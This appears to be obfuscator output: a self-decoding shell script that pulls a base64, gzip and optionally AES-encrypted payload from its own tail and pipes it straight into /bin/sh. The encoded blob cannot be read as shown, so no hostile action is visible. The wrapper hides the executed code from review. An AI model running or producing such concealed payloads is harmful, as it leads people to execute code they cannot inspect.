#!/usr/bin/env sh
# Self-decoding shell script (gzip+base64, optional AES-256-CBC via OpenSSL)
# If encrypted: set OBF_PASSPHRASE env or you will be prompted interactively.

set -eu

need() {
  command -v "$1" >/dev/null 2>&1
}

dec_b64() {
  # Decode base64 from stdin to stdout using available tools
  if need base64; then base64 -d 2>/dev/null || base64 --decode; return; fi
  if need openssl; then openssl base64 -d; return; fi
  if need python3; then python3 - <<'PY'
import sys, base64
sys.stdout.buffer.write(base64.b64decode(sys.stdin.buffer.read()))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, base64
sys.stdout.write(base64.b64decode(sys.stdin.read()))
PY
  return; fi
  if need perl; then perl -MMIME::Base64 -ne 'print decode_base64($_)'; return; fi
  if need busybox; then busybox base64 -d; return; fi
  echo "No base64 decoder found." >&2; exit 1
}

dec_gzip() {
  # Decompress gzip from stdin to stdout
  if need gzip; then gzip -dc; return; fi
  if need busybox; then busybox gzip -dc; return; fi
  # Python fallback using zlib
  if need python3; then python3 - <<'PY'
import sys, zlib
sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, zlib
sys.stdout.write(zlib.decompress(sys.stdin.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  echo "No gzip decompressor found." >&2; exit 1
}

dec_aes() {
  # Decrypt AES-256-CBC with OpenSSL from stdin to stdout using OBF_PASSPHRASE
  if ! need openssl; then
    echo "OpenSSL not available for AES decryption." >&2; exit 1
  fi
  pass="${OBF_PASSPHRASE:-}"
  if [ -z "$pass" ]; then
    printf "Enter passphrase: " >&2
    stty -echo 2>/dev/null || true
    IFS= read -r pass || true
    stty echo 2>/dev/null || true
    echo >&2
  fi
  # pbkdf2 because the obfuscator used it
  OPENSSL_PASS="pass:$pass" exec openssl enc -d -aes-256-cbc -pbkdf2 -pass "$OPENSSL_PASS"
}

# Metadata injected by obfuscator
OBF_ENCRYPTED="0"

# Payload below between markers
PAYLOAD_B64_START="__OBF_B64_PAYLOAD_START__"
PAYLOAD_B64_END="__OBF_B64_PAYLOAD_END__"

# Extract the base64 payload lines
extract_payload() {
  awk "/$PAYLOAD_B64_START/{flag=1;next}/$PAYLOAD_B64_END/{flag=0}flag" "$0"
}

run() {
  if [ "$OBF_ENCRYPTED" = "1" ]; then
    extract_payload | dec_b64 | dec_aes | dec_gzip | /bin/sh -s -- "$@"
  else
    extract_payload | dec_b64 | dec_gzip | /bin/sh -s -- "$@"
  fi
}

run "$@"
exit 0

__OBF_B64_PAYLOAD_START__
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
__OBF_B64_PAYLOAD_END__
